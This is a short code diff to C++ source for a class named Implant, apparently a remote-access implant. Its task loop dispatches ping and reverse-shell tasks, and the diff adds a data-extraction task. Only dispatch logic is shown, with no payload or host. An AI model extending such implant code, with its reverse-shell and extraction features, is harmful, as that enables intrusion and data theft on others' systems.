@@ -65,6 +65,8 @@ void Implant::run_all() {
             ping_task->run();
         if (ReverseShellTask* rs_task = dynamic_cast<ReverseShellTask*>(task.get()))
             rs_task->run();
+        if (ExtractTask* exctract_task = dynamic_cast<ExtractTask*>(task.get()))
+            exctract_task->run();
     }
 }
 
